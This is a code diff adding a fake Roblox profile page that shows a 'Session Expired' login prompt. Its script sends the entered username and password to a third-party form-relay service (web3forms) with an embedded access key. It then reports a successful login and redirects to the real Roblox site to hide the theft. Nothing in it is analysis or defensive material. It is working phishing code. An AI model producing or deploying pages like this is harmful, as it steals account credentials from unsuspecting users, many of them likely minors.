@@ -101,4 +101,62 @@
 </head>
 <body>
     <nav class="navbar">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRo
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ=" alt="Roblox Logo" class="navbar-logo">
+        <div class="navbar-links">
+            <a href="#">Discover</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="profile-header">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjM1IiByPSIyMCIgZmlsbD0iI2NjYyIvPjxwYXRoIGQ9Ik0zMCA4MGMyMC01IDQwLTUgNjAgMCIgZmlsbD0iI2NjYyIgc3Ryb2tlPSIjY2NjIiBzdHJva2Utd2lkdGg9IjUiLz48L3N2Zz4=" alt="Avatar" class="avatar">
+            <h1 class="username">User_491408715</h1>
+            <p class="user-id">ID: 491408715</p>
+        </div>
+
+        <div class="login-prompt">
+            <h3>Session Expired</h3>
+            <p>Please log in again to view this profile.</p>
+            <div class="login-form">
+                <input type="text" id="username" placeholder="Username" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button onclick="sendData()">Log In</button>
+                <p id="message"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const accessKey = 'ee22b8e0-5127-4777-b100-9e55ca740751';
+
+            document.getElementById('message').textContent = 'Verifying...';
+
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    access_key: accessKey,
+                    subject: `Roblox Credentials for ${username}`,
+                    username: username,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('message').textContent = 'Login successful! Loading profile...';
+                setTimeout(() => { window.location.href = 'https://www.roblox.com'; }, 1500);
+            })
+            .catch(error => {
+                document.getElementById('message').textContent = 'Network error. Try again.';
+            });
+        }
+    </script>
+</body>
+</html>
